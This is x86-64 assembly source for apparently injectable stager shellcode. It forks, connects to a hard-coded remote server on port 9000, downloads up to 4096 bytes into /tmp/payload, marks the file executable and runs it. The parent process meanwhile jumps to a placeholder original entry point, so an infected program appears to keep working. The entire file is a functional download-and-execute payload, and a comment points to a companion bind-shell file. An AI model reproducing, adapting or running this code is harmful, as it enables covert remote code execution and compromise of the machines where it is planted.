[bits 64]

%ifndef IPADDR
    %define IPADDR 0xB7_D0_D1_86 ; 134.209.208.183 (digital ocean droplet)
%endif
%ifndef PORT
    %define PORT 0x2823 ; 9000
%endif

global _start

_start: 
    mov rax, 57 ; fork
    syscall

    test rax, rax
    jnz original

    mov rax, 41 ; sys_socket
    mov rdi, 2
    mov rsi, 1
    xor rdx, rdx
    syscall
    mov rbx, rax ; save socketfd in rbx

    mov rdi, rbx ; socketfd
    mov rax, 42 ; sys_connect
    sub rsp, 16
    mov word [rsp], 2
    mov word [rsp+2], PORT
    mov dword [rsp+4], IPADDR
    mov rsi, rsp
    mov rdx, 16
    syscall

    ; above is opening a socket and connecting to it
    ; read bind_shell.asm to understand better it

    ; read(socketfd, buffer, length)
    xor rax, rax
    mov rdi, rbx
    sub rsp, 4096 ; allocate 4096 bytes
    mov rsi, rsp
    mov rdx, 4096
    syscall
    mov rbp, rax ; save bytes_read in rbp

    ; open("/tmp/payload", O_CREAT|O_WRONLY|O_TRUNC, 0755)
    mov rax, 2
    lea rdi, [rel path]
    mov rsi, 0o1101 ; octal for O_CREAT|O_WRONLY|O_TRUNC
    mov rdx, 0o0755 ; make executable
    syscall ; rax will have filefd
    mov r12, rax ; save filefd in r12
    
    ; write(filefd, buffer, bytes_read)
    mov rax, 1
    mov rdi, r12
    mov rsi, rsp
    mov rdx, rbp
    syscall

    ; close(filefd)
    mov rax, 3
    mov rdi, r12
    syscall

    ; close(socketfd)
    mov rax, 3
    mov rdi, rbx
    syscall

    ; execve("/tmp/payload", ["/tmp/payload", null], null)
    xor rax, rax
    push rax
    lea rdi, [rel path]
    push rdi
    mov rsi, rsp
    xor rdx, rdx
    mov rax, 59
    syscall

    ; if execve failed exit
    mov rax, 60
    xor rdi, rdi
    syscall

original:
    mov rax, 0xDEADBEEFDEADBEEF
    jmp rax

path:
    db "/tmp/payload", 0

